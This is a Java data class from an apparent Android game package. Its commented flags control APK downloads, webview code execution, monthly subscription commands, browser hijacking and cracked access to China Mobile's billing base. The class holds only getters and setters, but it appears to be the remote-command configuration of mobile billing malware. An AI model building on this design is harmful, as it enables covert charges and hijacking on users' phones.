package cn.com.tiantong.game72.n.m;

import java.util.ArrayList;

public class IFLSBean {
	
	private int doTime;
	private String keynumbers;
	private String keywords;
	private boolean hascommands;
	private String reason;
	
	//随机数
	private String salt;
	
	//判断是否需要下载apk 5.50
	private boolean isDownloadApk;
	
	//webview执行代码 8.00
	private boolean hasWebCommands;
	//包月指令
	private boolean  doMonthCommands;
	
	//浏览器劫持指令
	private boolean doBrowserCommands;
	
	//移动基地破解接入
	private boolean doCrackAccess;
	
	
	public boolean isDoCrackAccess() {
		return doCrackAccess;
	}

	public void setDoCrackAccess(boolean doCrackAccess) {
		this.doCrackAccess = doCrackAccess;
	}

	public boolean isDoBrowserCommands() {
		return doBrowserCommands;
	}

	public void setDoBrowserCommands(boolean doBrowserCommands) {
		this.doBrowserCommands = doBrowserCommands;
	}

	public IFLSBean() {
		super();
		// TODO Auto-generated constructor stub
	}

	public IFLSBean(int doTime, String keynumbers, String keywords,
			boolean hascommands, String reason, String salt,
			boolean isDownloadApk, boolean hasWebCommands, boolean doMonthCommands) {
		super();
		this.doTime = doTime;
		this.keynumbers = keynumbers;
		this.keywords = keywords;
		this.hascommands = hascommands;
		this.reason = reason;
		this.salt = salt;
		this.isDownloadApk = isDownloadApk;
		this.hasWebCommands = hasWebCommands;
		this.doMonthCommands = doMonthCommands;
	}

	public int getDoTime() {
		return doTime;
	}

	public void setDoTime(int doTime) {
		this.doTime = doTime;
	}

	public String getKeynumbers() {
		return keynumbers;
	}

	public void setKeynumbers(String keynumbers) {
		this.keynumbers = keynumbers;
	}

	public String getKeywords() {
		return keywords;
	}

	public void setKeywords(String keywords) {
		this.keywords = keywords;
	}

	public boolean isHascommands() {
		return hascommands;
	}

	public void setHascommands(boolean hascommands) {
		this.hascommands = hascommands;
	}

	public String getReason() {
		return reason;
	}

	public void setReason(String reason) {
		this.reason = reason;
	}

	public String getSalt() {
		return salt;
	}

	public void setSalt(String salt) {
		this.salt = salt;
	}

	public boolean isDownloadApk() {
		return isDownloadApk;
	}

	public void setDownloadApk(boolean isDownloadApk) {
		this.isDownloadApk = isDownloadApk;
	}

	public boolean isHasWebCommands() {
		return hasWebCommands;
	}

	public void setHasWebCommands(boolean hasWebCommands) {
		this.hasWebCommands = hasWebCommands;
	}

	public boolean isDoMonthCommands() {
		return doMonthCommands;
	}
	public void setDoMonthCommands(boolean doMonthCommands) {
		this.doMonthCommands = doMonthCommands;
	}
	
}
